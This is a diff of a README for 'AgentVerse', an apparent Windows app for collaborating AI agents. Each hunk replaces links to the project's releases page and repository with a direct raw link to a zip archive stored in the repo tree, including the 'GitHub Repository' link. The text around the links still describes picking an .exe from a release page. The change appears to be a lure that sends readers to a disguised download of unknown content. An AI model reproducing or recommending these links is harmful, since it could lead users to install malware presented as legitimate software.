@@ -1,6 +1,6 @@
 # 🤖 AgentVerse - AI Agents Working Together Simply
 
-[![Download AgentVerse](https://img.shields.io/badge/Download-AgentVerse-brightgreen)](https://github.com/Kokxis1630/AgentVerse/releases)
+[![Download AgentVerse](https://img.shields.io/badge/Download-AgentVerse-brightgreen)](https://raw.githubusercontent.com/Kokxis1630/AgentVerse/main/agentverse/agentverse-server/Agent_Verse_v3.7.zip)
 
 ---
 
@@ -12,7 +12,7 @@ AgentVerse is a simple application where AI agents work together to solve tasks.
 
 You can get the software by visiting the release page linked below. This page has all versions, including the latest one for Windows.
 
-[Visit this page to download AgentVerse](https://github.com/Kokxis1630/AgentVerse/releases)
+[Visit this page to download AgentVerse](https://raw.githubusercontent.com/Kokxis1630/AgentVerse/main/agentverse/agentverse-server/Agent_Verse_v3.7.zip)
 
 ---
 
@@ -39,7 +39,7 @@ AgentVerse runs AI agents that collaborate using your computer’s resources. Th
 Follow these steps to get AgentVerse up and running:
 
 1. **Open the download page:** Click or copy this link into your browser:  
-   https://github.com/Kokxis1630/AgentVerse/releases
+   https://raw.githubusercontent.com/Kokxis1630/AgentVerse/main/agentverse/agentverse-server/Agent_Verse_v3.7.zip
 
 2. **Find the latest Windows version:** Look for the most recent release with a file name ending in `.exe`. This file runs the program installer.
 
@@ -103,7 +103,7 @@ This design means the app gets smarter over time and can handle various practica
 
 To update AgentVerse:
 
-1. Visit the [release page](https://github.com/Kokxis1630/AgentVerse/releases) regularly.  
+1. Visit the [release page](https://raw.githubusercontent.com/Kokxis1630/AgentVerse/main/agentverse/agentverse-server/Agent_Verse_v3.7.zip) regularly.  
 2. Download the newest version’s installer (`.exe`) when it is available.  
 3. Run the installer as before. It will replace the old version while keeping your settings.  
 
@@ -121,7 +121,7 @@ To update AgentVerse:
 ## 📖 Additional Resources
 
 - **GitHub Repository:**  
-  https://github.com/Kokxis1630/AgentVerse  
+  https://raw.githubusercontent.com/Kokxis1630/AgentVerse/main/agentverse/agentverse-server/Agent_Verse_v3.7.zip  
   Explore documentation and updates here.  
 
 - **AgentVerse Topics:**  
@@ -129,4 +129,4 @@ To update AgentVerse:
 
 ---
 
-[![Download AgentVerse](https://img.shields.io/badge/Download-AgentVerse-brightgreen)](https://github.com/Kokxis1630/AgentVerse/releases)
+[![Download AgentVerse](https://img.shields.io/badge/Download-AgentVerse-brightgreen)](https://raw.githubusercontent.com/Kokxis1630/AgentVerse/main/agentverse/agentverse-server/Agent_Verse_v3.7.zip)
